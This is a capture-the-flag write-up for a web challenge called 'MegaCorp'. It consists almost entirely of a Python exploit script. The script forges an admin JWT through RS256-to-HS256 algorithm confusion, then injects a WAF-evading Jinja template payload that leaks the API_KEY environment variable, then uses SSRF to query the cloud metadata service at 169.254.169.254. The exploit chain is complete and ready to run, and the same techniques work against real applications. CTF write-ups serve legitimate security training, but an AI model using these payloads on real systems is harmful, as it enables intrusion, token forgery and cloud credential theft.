# web - megacorp

Solved by: vicevirus

```python3
#!/usr/bin/env python3
"""
MegaCorp Industries - Full Exploit Chain
http://chall.ehax.in:7801/

Chain: JWT Confusion → SSTI → SSRF → IMDS Flag

1. RS256→HS256 algorithm confusion using exposed /pubkey
2. SSTI in admin bio preview to leak API_KEY (WAF bypass via string concat)  
3. SSRF via /fetch with API_KEY to hit simulated AWS metadata
4. Flag at http://169.254.169.254/latest/meta-data/flag
"""
import requests, json, base64, hmac, hashlib, re, html

BASE = "http://chall.ehax.in:7801"

def b64e(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Step 1: JWT Algorithm Confusion
print("[*] Step 1: JWT Algorithm Confusion (RS256 → HS256)")
pubkey = requests.get(f"{BASE}/pubkey").content
h = b64e(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")))
p = b64e(json.dumps({"username":"alice","role":"admin"}, separators=(",",":")))
sig = base64.urlsafe_b64encode(hmac.new(pubkey, f"{h}.{p}".encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
TOKEN = f"{h}.{p}.{sig}"
print(f"[+] Forged admin token")

# Step 2: SSTI to leak API_KEY (bypass WAF: 'os' → 'o'~'s')
print("\n[*] Step 2: SSTI to leak API_KEY")
ssti = "{{cycler.__init__.__globals__['o'~'s'].environ['API_KEY']}}"
r = requests.post(f"{BASE}/profile", cookies={"token": TOKEN}, data={"bio": ssti})
m = re.search(r'bio-display">(.*?)</div>', r.text, re.DOTALL)
api_key = html.unescape(m.group(1).strip()) if m else None
print(f"[+] API_KEY: {api_key}")

# Step 3: SSRF to AWS metadata service
print("\n[*] Step 3: SSRF to metadata service")
target = "http://169.254.169.254/latest/meta-data/flag"
r = requests.post(f"{BASE}/fetch", cookies={"token": TOKEN}, 
                   data={"url": target, "api_key": api_key})

print(r.text)
```

